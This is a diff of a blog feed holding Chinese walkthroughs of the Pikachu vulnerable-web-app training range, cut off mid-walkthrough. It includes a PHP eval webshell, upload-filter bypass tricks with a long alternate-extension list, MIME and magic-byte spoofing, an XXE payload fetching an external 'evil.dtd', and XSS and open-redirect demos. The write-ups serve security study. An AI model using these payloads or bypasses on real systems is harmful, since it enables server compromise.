-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://cloud.tencent.com/developer/article/2090744">https://cloud.tencent.com/developer/article/2090744</a></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE name [</span><br><span class="line">	&lt;!ENTITY test SYSTEM &quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;&gt;</span><br><span class="line">	&lt;!ENTITY test SYSTEM &quot;http://192.168.1.111/evil.dtd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;name&gt;&amp;test;&lt;/name&gt;</span><br></pre></td></tr></table></figure>
-
 ]]></content>
       <categories>
         <category>pikachu靶场系列</category>
@@ -688,28 +709,6 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class HACK</span><br><span class="line">&#123;</span><br><span class="line">    public $test = &quot;pikachu&quot;;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        echo &quot;6666666666666&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$demo=new HACK();</span><br><span class="line">$demo-&gt;test=&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line"></span><br><span class="line">$a=serialize($demo);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$pikachu=unserialize($a);</span><br><span class="line">echo $pikachu-&gt;test;</span><br></pre></td></tr></table></figure>
 
 <p><img src="/images/image-20230110145751955.png" alt="image-20230110145751955"></p>
-]]></content>
-      <categories>
-        <category>pikachu靶场系列</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>pikachu靶场系列-不安全的URL跳转</title>
-    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84URL%E8%B7%B3%E8%BD%AC/</url>
-    <content><![CDATA[<p>如果后端采用了前端传进来的参数作为跳转的目的地，又没有做判断就可能跳转到钓鱼网站等恶意链接。</p>
-<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><img src="/images/image-20230110155041071.png" alt="image-20230110155041071"></p>
-<p>点击最后一个参数</p>
-<p>获取url</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/urlredirect/urlredirect.php?url=i</span><br></pre></td></tr></table></figure>
-
-<p>url指定重定向后的网页</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/urlredirect/urlredirect.php?url=https://www.baidu.com</span><br></pre></td></tr></table></figure>
-
-<p>重定向到百度</p>
-<p><img src="/images/image-20230110155158474.png" alt="image-20230110155158474"></p>
-<p>可以抓个包看看</p>
-<p><img src="/images/image-20230110155246615.png" alt="image-20230110155246615"></p>
-<p>可以看到302响应包中的location字段指向百度</p>
 ]]></content>
       <categories>
         <category>pikachu靶场系列</category>
@@ -1299,117 +1298,6 @@
       </categories>
   </entry>
   <entry>
-    <title>pikachu靶场系列-文件上传</title>
-    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
-    <content><![CDATA[<h1 id="客户端校验"><a href="#客户端校验" class="headerlink" title="客户端校验"></a>客户端校验</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[123]);?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>首先保存一个shell.php用于上传</p>
-<p>当上传时，会显示文件不符合要求</p>
-<p><img src="/images/image-20230110110325044.png" alt="image-20230110110325044"></p>
-<p>其实弹窗已经可以初步判断是客户端校验了</p>
-<p>也可以抓个包试试，当弹窗时并不会抓到任何数据包，所以为客户端校验</p>
-<p><img src="/images/image-20230110110530561.png" alt="image-20230110110530561"></p>
-<p>F12查看前端代码，可以看到使用了checkFileExt()函数用于校验上传的文件</p>
-<p><img src="/images/image-20230110110937647.png" alt="image-20230110110937647"></p>
-<p>直接将其删除</p>
-<p>此时再上传就不会有任何问题</p>
-<p><img src="/images/image-20230110110655236.png" alt="image-20230110110655236"></p>
-<p>蚁剑成功连接</p>
-<p><img src="/images/image-20230110110914717.png" alt="image-20230110110914717"></p>
-<h1 id="文件上传后缀名绕过"><a href="#文件上传后缀名绕过" class="headerlink" title="文件上传后缀名绕过"></a>文件上传后缀名绕过</h1><h3 id="0x81-贼好用"><a href="#0x81-贼好用" class="headerlink" title="0x81(贼好用)"></a>0x81(贼好用)</h3><p>0x82 0x83也可</p>
-<p>但同样为保留字符的0x80不行</p>
-<p>在文件后缀名后的hex添加一个81</p>
-<p><img src="/images/1667316762281-743e5c7b-0a8f-4047-a9e0-1006667f97f1.png" alt="img"></p>
-<p>0x81是一个很特殊的存在，也不是空格(0x20)，应该是代表空值</p>
-<p><img src="/images/1667317009753-4ceb4d26-4654-4512-befc-1fd4c7224fd9.png" alt="img"></p>
-<p>在java中0x81可能是编码 GBK 的不可映射字符 (0x81)</p>
-<h3 id="大小写"><a href="#大小写" class="headerlink" title="大小写"></a>大小写</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.Php .pHp .phP</span><br></pre></td></tr></table></figure>
-
-<h3 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">webshell. php</span><br><span class="line"></span><br><span class="line">webshell.php(空格)</span><br></pre></td></tr></table></figure>
-
-<h3 id="DATA"><a href="#DATA" class="headerlink" title="::$DATA"></a>::$DATA</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">::$DATA</span><br></pre></td></tr></table></figure>
-
-<p>windows下的php，在文件名后面加上::$DATA系统会把它当作文件流来进行处理，不会检测文件的后缀名，且保留::$DATA之前的文件名以及后缀</p>
-<h3 id="绕过"><a href="#绕过" class="headerlink" title=".绕过"></a>.绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">webshell..php</span><br><span class="line"></span><br><span class="line">webshell.php.</span><br><span class="line"></span><br><span class="line">webshell.php. .</span><br></pre></td></tr></table></figure>
-
-<h3 id="双写后缀名"><a href="#双写后缀名" class="headerlink" title="双写后缀名"></a>双写后缀名</h3><p>有些站点判断方式会把文件后缀名替换为空字符，遇到这种情况我们只需要双写后缀名来绕过</p>
-<p>例如</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">webshell.phphpp</span><br></pre></td></tr></table></figure>
-
-<p>原理就是服务器把后缀名中的php进行替换，替换成空字符之后为被替换的剩余字符组成了php，从而达到绕过的效果</p>
-<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>%00截断经常用在服务端把文件路径和文件名加在一起进行判断后缀，</p>
-<p>例如</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/upload/webshell.php%00webshell.jpg</span><br></pre></td></tr></table></figure>
-
-<p>在这里系统解析的时候会自动忽略%00后面的内容，最终解析为&#x2F;upload&#x2F;webshell.php</p>
-<p>从而达到绕过的目的</p>
-<p><img src="/images/1667314977664-cbd64322-4a65-4a0d-a6e0-b7eb1f07f94f.png" alt="img"></p>
-<h3 id="后缀嵌套"><a href="#后缀嵌套" class="headerlink" title="后缀嵌套"></a>后缀嵌套</h3><p>用于服务器从前往后将发现的php去除后保存的站点</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpshell.pphphp</span><br></pre></td></tr></table></figure>
-
-<h3 id="另类后缀名"><a href="#另类后缀名" class="headerlink" title="另类后缀名"></a>另类后缀名</h3><p>还可以尝试一些近似的后缀名</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> asp:asa/cer/cdx</span><br><span class="line"> aspx:ashx/asax/ascx/asmx</span><br><span class="line"> php:phtml/php1/php2//php3/php4/php5/pht/</span><br><span class="line"> jsp:jspx/jspa/jsw/jsv/jspf/jhtml</span><br><span class="line">php</span><br><span class="line">php2</span><br><span class="line">php3</span><br><span class="line">php4</span><br><span class="line">php5</span><br><span class="line">pHp</span><br><span class="line">pHp2</span><br><span class="line">pHp3</span><br><span class="line">pHp4</span><br><span class="line">pHp5</span><br><span class="line">html</span><br><span class="line">htm</span><br><span class="line">phtml</span><br><span class="line">pht</span><br><span class="line">Html</span><br><span class="line">Htm</span><br><span class="line">pHtml</span><br><span class="line">asp</span><br><span class="line">aspx</span><br><span class="line">asa</span><br><span class="line">asax</span><br><span class="line">ashx</span><br><span class="line">asmx</span><br><span class="line">cer</span><br><span class="line">aSp</span><br><span class="line">aSpx</span><br><span class="line">aSa</span><br><span class="line">aSax</span><br><span class="line">aScx</span><br><span class="line">aShx</span><br><span class="line">aSmx</span><br><span class="line">cEr</span><br><span class="line">jsp</span><br><span class="line">jspa</span><br><span class="line">jspx</span><br><span class="line">jsw</span><br><span class="line">jxv</span><br><span class="line">jspf</span><br><span class="line">jtml</span><br><span class="line">JSp</span><br><span class="line">jSpx</span><br><span class="line">jSpa</span><br><span class="line">jSw</span><br><span class="line">jSv</span><br><span class="line">jSpf</span><br><span class="line">jHtml</span><br><span class="line">asp/test.jpg</span><br><span class="line">asp;.jpg</span><br><span class="line">cer/test.jpg</span><br><span class="line">cer;.jpg</span><br><span class="line">asa/test.jpg</span><br><span class="line">asa;.jpg</span><br><span class="line">aSp/test.jpg</span><br><span class="line">aSp;.jpg</span><br><span class="line">cEr/test.jpg</span><br><span class="line">cEr;.jpg</span><br><span class="line">aSa/test.jpg</span><br><span class="line">aSa;.jpg</span><br><span class="line">jpg/xx.php</span><br><span class="line">jpg/xx.pHp</span><br><span class="line">jpg/.php</span><br><span class="line">jpg/.pHp</span><br><span class="line">php.xs.aa</span><br><span class="line">php2.aa</span><br><span class="line">php3.aa</span><br><span class="line">php4.aa</span><br><span class="line">php5.aa</span><br><span class="line">pHp.aa</span><br><span class="line">pHp2.aa</span><br><span class="line">pHp3.aa</span><br><span class="line">pHp4.aaa</span><br><span class="line">pHp5.aa</span><br><span class="line">html.aa</span><br><span class="line">htm.aa</span><br><span class="line">phtml.aa</span><br><span class="line">pht.aaa</span><br><span class="line">Html.aaa</span><br><span class="line">Htm.aa</span><br><span class="line">pHtml.aa</span><br><span class="line">php::$DATA</span><br></pre></td></tr></table></figure>
-
-<h1 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize()"></a>getimagesize()</h1><p>可以看一下网站源码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    $type=array(&#x27;jpg&#x27;,&#x27;jpeg&#x27;,&#x27;png&#x27;);//指定类型</span><br><span class="line">    $mime=array(&#x27;image/jpg&#x27;,&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;);</span><br><span class="line">    $save_path=&#x27;uploads&#x27;.date(&#x27;/Y/m/d/&#x27;);//根据当天日期生成一个文件夹</span><br><span class="line">    $upload=upload(&#x27;uploadfile&#x27;,&#x27;512000&#x27;,$type,$mime,$save_path);//调用函数</span><br><span class="line">    if($upload[&#x27;return&#x27;])&#123;</span><br><span class="line">        $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;文件上传成功&lt;/p&gt;&lt;p class=&#x27;notice&#x27;&gt;文件保存的路径为：&#123;$upload[&#x27;save_path&#x27;]&#125;&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $html.=&quot;&lt;p class=notice&gt;&#123;$upload[&#x27;error&#x27;]&#125;&lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>服务端校验了文件的MIME和后缀，并且用的是白名单</p>
-<p>可以看到还校验了文件内容</p>
-<p><img src="/images/image-20230110112128136.png" alt="image-20230110112128136"></p>
-<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>1.文件内容添加</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br></pre></td></tr></table></figure>
-
-<p>这是gif文件的文件头</p>
-<p>其他的请求头可以参考《文件上传内容校验绕过》</p>
-<p>2.更改后缀为png</p>
-<p>3.更改MIME类型为image&#x2F;png</p>
-<p><img src="/images/image-20230110113115973.png" alt="image-20230110113115973"></p>
-<p>成功上传</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uploads/2023/01/10/27979263bcdba99b950336034711.png</span><br></pre></td></tr></table></figure>
-
-<p>由于后缀为png，所以这里需要配合文件包含进行利用</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=../../unsafeupload/uploads/2023/01/10/27979263bcdba99b950336034711.png</span><br></pre></td></tr></table></figure>
-
-<p>url为</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2023/01/10/27979263bcdba99b950336034711.png&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>
-
-<p>成功连接webshell</p>
-<p><img src="/images/image-20230110133348854.png" alt="image-20230110133348854"></p>
-<h1 id="MIME-type"><a href="#MIME-type" class="headerlink" title="MIME type"></a>MIME type</h1><p>MIME类型用来告诉服务器，上传的文件内容是什么类型</p>
-<p>MIME校验就是服务器端限制上传文件的MIME，是一种服务端的校验</p>
-<p>MIME是由上传文件的body的Content-Type指定的</p>
-<p><img src="/images/image-20230110111354014.png" alt="image-20230110111354014"></p>
-<h3 id="常见的MIME类型"><a href="#常见的MIME类型" class="headerlink" title="常见的MIME类型"></a>常见的MIME类型</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">超文本标记语言文本 .html、.html：text/html</span><br><span class="line"></span><br><span class="line"> 普通文本 .txt： text/plain</span><br><span class="line"></span><br><span class="line"> RTF 文本 .rtf： application/rtf</span><br><span class="line"></span><br><span class="line"> GIF 图形 .gif： image/gif</span><br><span class="line"></span><br><span class="line"> JPEG 图形 .jpeg、.jpg： image/jpeg</span><br><span class="line"></span><br><span class="line"> au 声音文件 .au： audio/basic</span><br><span class="line"></span><br><span class="line"> MIDI 音乐文件 mid、.midi： audio/midi、audio/x-midi</span><br><span class="line"></span><br><span class="line"> RealAudio 音乐文件 .ra、.ram： audio/x-pn-realaudio</span><br><span class="line"></span><br><span class="line"> MPEG 文件 .mpg、.mpeg： video/mpeg</span><br><span class="line"></span><br><span class="line"> AVI 文件 .avi： video/x-msvideo</span><br><span class="line"></span><br><span class="line"> GZIP 文件 .gz： application/x-gzip</span><br><span class="line"></span><br><span class="line"> TAR 文件 .tar： application/x-tar</span><br><span class="line"> </span><br><span class="line"> png文件 image/png</span><br></pre></td></tr></table></figure>
-
-<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>当上传webshell时</p>
-<p><img src="/images/image-20230110111246587.png" alt="image-20230110111246587"></p>
-<p>此时Content-Type指定的MIME类型为application&#x2F;octet-stream</p>
-<p>将其改为jpg或png的MIME类型</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jpg image/jpeg</span><br><span class="line"></span><br><span class="line">png image/png</span><br></pre></td></tr></table></figure>
-
-<p>成功上传</p>
-<p><img src="/images/image-20230110111611594.png" alt="image-20230110111611594"></p>
-<p>成功连接webshell</p>
-<p><img src="/images/image-20230110111625267.png" alt="image-20230110111625267"></p>
-<h1 id="文件上传内容校验绕过"><a href="#文件上传内容校验绕过" class="headerlink" title="文件上传内容校验绕过"></a>文件上传内容校验绕过</h1><h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><p>这里在使用的时候建议直接去修改hex中的16进制</p>
-<h5 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PNG文件头: 89 50 4E 47 0D 0A 1A 0A </span><br><span class="line"></span><br><span class="line">JPG文件头: FF D8 FF</span><br><span class="line"></span><br><span class="line">GIF (gif)文件头：47494638</span><br></pre></td></tr></table></figure>
-
-<h5 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br></pre></td></tr></table></figure>
-
-<h5 id="JPG"><a href="#JPG" class="headerlink" title="JPG"></a>JPG</h5><p>16进制文件头为</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FF D8 FF</span><br></pre></td></tr></table></figure>
-
-<h5 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h5><p>16进制文件头为</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">89 50 4E 47</span><br></pre></td></tr></table></figure>
-
-<h5 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Zip Compressed</span><br></pre></td></tr></table></figure>
-
-<h5 id="doc-xls-xlt-ppt-apr"><a href="#doc-xls-xlt-ppt-apr" class="headerlink" title="doc;xls;xlt;ppt;apr"></a>doc;xls;xlt;ppt;apr</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MS Compound Document v1 or Lotus Approach APRfile</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>pikachu靶场系列</category>
-      </categories>
-  </entry>
-  <entry>
     <title>pikachu靶场系列-xss</title>
     <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/xss/</url>
     <content><![CDATA[<h1 id="XSS概述"><a href="#XSS概述" class="headerlink" title="XSS概述"></a>XSS概述</h1><p><img src="/./assets/1660183695659-3123c470-f608-4694-b555-23d2741c5e75.png" alt="img"></p>
@@ -1798,6 +1686,139 @@
       </categories>
   </entry>
   <entry>
+    <title>pikachu靶场系列-不安全的URL跳转</title>
+    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84URL%E8%B7%B3%E8%BD%AC/</url>
+    <content><![CDATA[<p>如果后端采用了前端传进来的参数作为跳转的目的地，又没有做判断就可能跳转到钓鱼网站等恶意链接。</p>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><img src="/images/image-20230110155041071.png" alt="image-20230110155041071"></p>
+<p>点击最后一个参数</p>
+<p>获取url</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/urlredirect/urlredirect.php?url=i</span><br></pre></td></tr></table></figure>
+
+<p>url指定重定向后的网页</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/urlredirect/urlredirect.php?url=https://www.baidu.com</span><br></pre></td></tr></table></figure>
+
+<p>重定向到百度</p>
+<p><img src="/images/image-20230110155158474.png" alt="image-20230110155158474"></p>
+<p>可以抓个包看看</p>
+<p><img src="/images/image-20230110155246615.png" alt="image-20230110155246615"></p>
+<p>可以看到302响应包中的location字段指向百度</p>
+]]></content>
+      <categories>
+        <category>pikachu靶场系列</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>pikachu靶场系列-文件上传</title>
+    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
+    <content><![CDATA[<h1 id="客户端校验"><a href="#客户端校验" class="headerlink" title="客户端校验"></a>客户端校验</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[123]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>首先保存一个shell.php用于上传</p>
+<p>当上传时，会显示文件不符合要求</p>
+<p><img src="/images/image-20230110110325044.png" alt="image-20230110110325044"></p>
+<p>其实弹窗已经可以初步判断是客户端校验了</p>
+<p>也可以抓个包试试，当弹窗时并不会抓到任何数据包，所以为客户端校验</p>
+<p><img src="/images/image-20230110110530561.png" alt="image-20230110110530561"></p>
+<p>F12查看前端代码，可以看到使用了checkFileExt()函数用于校验上传的文件</p>
+<p><img src="/images/image-20230110110937647.png" alt="image-20230110110937647"></p>
+<p>直接将其删除</p>
+<p>此时再上传就不会有任何问题</p>
+<p><img src="/images/image-20230110110655236.png" alt="image-20230110110655236"></p>
+<p>蚁剑成功连接</p>
+<p><img src="/images/image-20230110110914717.png" alt="image-20230110110914717"></p>
+<h1 id="文件上传后缀名绕过"><a href="#文件上传后缀名绕过" class="headerlink" title="文件上传后缀名绕过"></a>文件上传后缀名绕过</h1><h3 id="0x81-贼好用"><a href="#0x81-贼好用" class="headerlink" title="0x81(贼好用)"></a>0x81(贼好用)</h3><p>0x82 0x83也可</p>
+<p>但同样为保留字符的0x80不行</p>
+<p>在文件后缀名后的hex添加一个81</p>
+<p><img src="/images/1667316762281-743e5c7b-0a8f-4047-a9e0-1006667f97f1.png" alt="img"></p>
+<p>0x81是一个很特殊的存在，也不是空格(0x20)，应该是代表空值</p>
+<p><img src="/images/1667317009753-4ceb4d26-4654-4512-befc-1fd4c7224fd9.png" alt="img"></p>
+<p>在java中0x81可能是编码 GBK 的不可映射字符 (0x81)</p>
+<h3 id="大小写"><a href="#大小写" class="headerlink" title="大小写"></a>大小写</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.Php .pHp .phP</span><br></pre></td></tr></table></figure>
+
+<h3 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">webshell. php</span><br><span class="line"></span><br><span class="line">webshell.php(空格)</span><br></pre></td></tr></table></figure>
+
+<h3 id="DATA"><a href="#DATA" class="headerlink" title="::$DATA"></a>::$DATA</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">::$DATA</span><br></pre></td></tr></table></figure>
+
+<p>windows下的php，在文件名后面加上::$DATA系统会把它当作文件流来进行处理，不会检测文件的后缀名，且保留::$DATA之前的文件名以及后缀</p>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title=".绕过"></a>.绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">webshell..php</span><br><span class="line"></span><br><span class="line">webshell.php.</span><br><span class="line"></span><br><span class="line">webshell.php. .</span><br></pre></td></tr></table></figure>
+
+<h3 id="双写后缀名"><a href="#双写后缀名" class="headerlink" title="双写后缀名"></a>双写后缀名</h3><p>有些站点判断方式会把文件后缀名替换为空字符，遇到这种情况我们只需要双写后缀名来绕过</p>
+<p>例如</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">webshell.phphpp</span><br></pre></td></tr></table></figure>
+
+<p>原理就是服务器把后缀名中的php进行替换，替换成空字符之后为被替换的剩余字符组成了php，从而达到绕过的效果</p>
+<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>%00截断经常用在服务端把文件路径和文件名加在一起进行判断后缀，</p>
+<p>例如</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/upload/webshell.php%00webshell.jpg</span><br></pre></td></tr></table></figure>
+
+<p>在这里系统解析的时候会自动忽略%00后面的内容，最终解析为&#x2F;upload&#x2F;webshell.php</p>
+<p>从而达到绕过的目的</p>
+<p><img src="/images/1667314977664-cbd64322-4a65-4a0d-a6e0-b7eb1f07f94f.png" alt="img"></p>
+<h3 id="后缀嵌套"><a href="#后缀嵌套" class="headerlink" title="后缀嵌套"></a>后缀嵌套</h3><p>用于服务器从前往后将发现的php去除后保存的站点</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpshell.pphphp</span><br></pre></td></tr></table></figure>
+
+<h3 id="另类后缀名"><a href="#另类后缀名" class="headerlink" title="另类后缀名"></a>另类后缀名</h3><p>还可以尝试一些近似的后缀名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> asp:asa/cer/cdx</span><br><span class="line"> aspx:ashx/asax/ascx/asmx</span><br><span class="line"> php:phtml/php1/php2//php3/php4/php5/pht/</span><br><span class="line"> jsp:jspx/jspa/jsw/jsv/jspf/jhtml</span><br><span class="line">php</span><br><span class="line">php2</span><br><span class="line">php3</span><br><span class="line">php4</span><br><span class="line">php5</span><br><span class="line">pHp</span><br><span class="line">pHp2</span><br><span class="line">pHp3</span><br><span class="line">pHp4</span><br><span class="line">pHp5</span><br><span class="line">html</span><br><span class="line">htm</span><br><span class="line">phtml</span><br><span class="line">pht</span><br><span class="line">Html</span><br><span class="line">Htm</span><br><span class="line">pHtml</span><br><span class="line">asp</span><br><span class="line">aspx</span><br><span class="line">asa</span><br><span class="line">asax</span><br><span class="line">ashx</span><br><span class="line">asmx</span><br><span class="line">cer</span><br><span class="line">aSp</span><br><span class="line">aSpx</span><br><span class="line">aSa</span><br><span class="line">aSax</span><br><span class="line">aScx</span><br><span class="line">aShx</span><br><span class="line">aSmx</span><br><span class="line">cEr</span><br><span class="line">jsp</span><br><span class="line">jspa</span><br><span class="line">jspx</span><br><span class="line">jsw</span><br><span class="line">jxv</span><br><span class="line">jspf</span><br><span class="line">jtml</span><br><span class="line">JSp</span><br><span class="line">jSpx</span><br><span class="line">jSpa</span><br><span class="line">jSw</span><br><span class="line">jSv</span><br><span class="line">jSpf</span><br><span class="line">jHtml</span><br><span class="line">asp/test.jpg</span><br><span class="line">asp;.jpg</span><br><span class="line">cer/test.jpg</span><br><span class="line">cer;.jpg</span><br><span class="line">asa/test.jpg</span><br><span class="line">asa;.jpg</span><br><span class="line">aSp/test.jpg</span><br><span class="line">aSp;.jpg</span><br><span class="line">cEr/test.jpg</span><br><span class="line">cEr;.jpg</span><br><span class="line">aSa/test.jpg</span><br><span class="line">aSa;.jpg</span><br><span class="line">jpg/xx.php</span><br><span class="line">jpg/xx.pHp</span><br><span class="line">jpg/.php</span><br><span class="line">jpg/.pHp</span><br><span class="line">php.xs.aa</span><br><span class="line">php2.aa</span><br><span class="line">php3.aa</span><br><span class="line">php4.aa</span><br><span class="line">php5.aa</span><br><span class="line">pHp.aa</span><br><span class="line">pHp2.aa</span><br><span class="line">pHp3.aa</span><br><span class="line">pHp4.aaa</span><br><span class="line">pHp5.aa</span><br><span class="line">html.aa</span><br><span class="line">htm.aa</span><br><span class="line">phtml.aa</span><br><span class="line">pht.aaa</span><br><span class="line">Html.aaa</span><br><span class="line">Htm.aa</span><br><span class="line">pHtml.aa</span><br><span class="line">php::$DATA</span><br></pre></td></tr></table></figure>
+
+<h1 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize()"></a>getimagesize()</h1><p>可以看一下网站源码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    $type=array(&#x27;jpg&#x27;,&#x27;jpeg&#x27;,&#x27;png&#x27;);//指定类型</span><br><span class="line">    $mime=array(&#x27;image/jpg&#x27;,&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;);</span><br><span class="line">    $save_path=&#x27;uploads&#x27;.date(&#x27;/Y/m/d/&#x27;);//根据当天日期生成一个文件夹</span><br><span class="line">    $upload=upload(&#x27;uploadfile&#x27;,&#x27;512000&#x27;,$type,$mime,$save_path);//调用函数</span><br><span class="line">    if($upload[&#x27;return&#x27;])&#123;</span><br><span class="line">        $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;文件上传成功&lt;/p&gt;&lt;p class=&#x27;notice&#x27;&gt;文件保存的路径为：&#123;$upload[&#x27;save_path&#x27;]&#125;&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $html.=&quot;&lt;p class=notice&gt;&#123;$upload[&#x27;error&#x27;]&#125;&lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>服务端校验了文件的MIME和后缀，并且用的是白名单</p>
+<p>可以看到还校验了文件内容</p>
+<p><img src="/images/image-20230110112128136.png" alt="image-20230110112128136"></p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>1.文件内容添加</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br></pre></td></tr></table></figure>
+
+<p>这是gif文件的文件头</p>
+<p>其他的请求头可以参考《文件上传内容校验绕过》</p>
+<p>2.更改后缀为png</p>
+<p>3.更改MIME类型为image&#x2F;png</p>
+<p><img src="/images/image-20230110113115973.png" alt="image-20230110113115973"></p>
+<p>成功上传</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uploads/2023/01/10/27979263bcdba99b950336034711.png</span><br></pre></td></tr></table></figure>
+
+<p>由于后缀为png，所以这里需要配合文件包含进行利用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=../../unsafeupload/uploads/2023/01/10/27979263bcdba99b950336034711.png</span><br></pre></td></tr></table></figure>
+
+<p>url为</p>
